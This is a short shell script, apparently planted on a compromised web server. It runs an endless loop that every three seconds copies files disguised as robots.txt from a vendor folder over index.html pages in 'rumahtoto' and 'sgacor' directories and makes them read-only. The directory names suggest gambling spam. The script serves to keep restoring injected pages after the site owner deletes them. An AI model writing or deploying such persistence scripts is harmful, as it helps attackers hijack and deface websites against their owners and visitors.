#!/bin/sh
#HaOMing_X12
while true
do
    # Copy file
    cp /home/stiatab2/public_html/vendor/ifsnop/robots.txt /home/stiatab2/public_html/rumahtoto/index.html

    chmod 444 /home/stiatab2/public_html/rumahtoto/index.html
    
    # Create directory
    mkdir /home/stiatab2/public_html/sgacor

    cp /home/stiatab2/public_html/vendor/robot.txt /home/stiatab2/public_html/sgacor/index.html

    chmod 444 /home/stiatab2/public_html/sgacor/index.html

    sleep 3
done
